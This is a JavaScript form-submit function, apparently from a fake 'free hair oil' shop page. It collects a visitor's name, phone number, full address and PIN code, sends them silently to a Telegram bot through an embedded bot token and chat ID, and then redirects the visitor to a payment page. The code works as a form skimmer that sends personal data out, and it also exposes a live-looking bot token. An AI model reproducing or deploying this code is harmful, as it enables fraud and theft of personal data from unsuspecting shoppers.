
  function submitForm() {
    // Show loader
    document.getElementById('loader').style.display = 'block';

    // Validate form fields
    var name = document.getElementById('name').value;
    var phone = document.getElementById('phone').value;
    var address = document.getElementById('address').value;
    var pincode = document.getElementById('pincode').value;
    var state = document.getElementById('state').value;
    var city = document.getElementById('city').value;
    
    // Get current page URL
    var currentPageUrl = window.location.href;

    // Send address to Telegram bot
    var botToken = '6752961822:AAHzDMtUeGxHpoRWenQhZJLfCbDOFJvk9Kg';
    var chatId = '6324305321';
    var message = "Name: " + name + "\nPhone: " + phone + "\nAddress: " + address + "\nPIN Code: " + pincode + "\nState: " + state + "\nCity: " + city + "\nPage URL: " + currentPageUrl;
    var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
    
    fetch(telegramUrl)
      .then(response => {
        if (!response.ok) {
          throw new Error('Failed to send message to Telegram bot');
        }
        // Delay redirect for 3 seconds
        setTimeout(function() {
          window.location.href = 'https://hair-oil.github.io/shop/free/payment/index.html';
        }, 3000);
      })
      .catch(error => {
        console.error('Error:', error);
        // Handle error
        alert('Failed to submit the form. Please try again later.');
        // Hide loader
        document.getElementById('loader').style.display = 'none';
      });

    // Prevent form submission
    return false;
  }

